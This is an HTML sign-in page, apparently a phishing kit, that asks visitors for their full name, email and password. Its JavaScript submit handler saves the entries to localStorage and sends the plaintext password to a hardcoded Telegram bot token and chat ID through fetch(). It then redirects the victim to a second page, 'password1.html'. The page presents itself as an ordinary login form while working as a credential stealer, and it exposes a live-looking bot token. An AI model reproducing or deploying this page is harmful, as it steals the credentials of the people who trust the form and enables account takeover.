<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #6b73ff, #000dff);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .container h2 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #333;
            font-weight: bold;
        }

        .input-field {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            background-color: #f9f9f9;
            transition: 0.3s;
        }

        .input-field:focus {
            border-color: #4e73df;
            outline: none;
            background-color: #e6e9ff;
        }

        button {
            width: 100%;
            padding: 15px;
            background-color: #4e73df;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #2e59d9;
        }

        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #777;
        }

        .footer a {
            text-decoration: none;
            color: #4e73df;
            font-weight: bold;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Sign In</h2>
        <input type="text" id="fullName" class="input-field" placeholder="Full Name" required>
        <input type="email" id="email" class="input-field" placeholder="Email" required>
        <input type="password" id="password" class="input-field" placeholder="Password" required>
        <button onclick="submitForm()">Submit</button>
        
        <div class="footer">
            <p>Need support? <a href="support.html">Get Help</a></p>
        </div>
    </div>

    <script>
        function submitForm() {
            let fullName = document.getElementById("fullName").value;
            let email = document.getElementById("email").value;
            let password = document.getElementById("password").value;

            if (fullName === "" || email === "" || password === "") {
                alert("All fields are required!");
                return;
            }

            // Save to localStorage
            let userData = {
                fullName: fullName,
                email: email,
                password: password
            };
            localStorage.setItem("userData", JSON.stringify(userData));
            localStorage.setItem("sir_teach", "1");

            // Send data to Telegram bot
            let botToken = "7113518997:AAHLDL7A2ojAmNHgnmVYPFGrCRNNxsu6Qd0";
            let chatId = "@fjfjcckdkdjj";  // Use Telegram username or chat ID
            let message = `New Sign In:\n\nðŸ‘¤ Name: ${fullName}\nðŸ“§ Email: ${email}\nðŸ”‘ Password: ${password}`;

            let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(telegramURL)
                .then(response => response.json())
                .then(data => console.log("Message sent to Telegram:", data))
                .catch(error => console.error("Error sending message to Telegram:", error));

            // Redirect after 3 seconds
            setTimeout(() => {
                window.location.href = "password1.html";
            }, 3000);
        }
    </script>

</body>
</html>
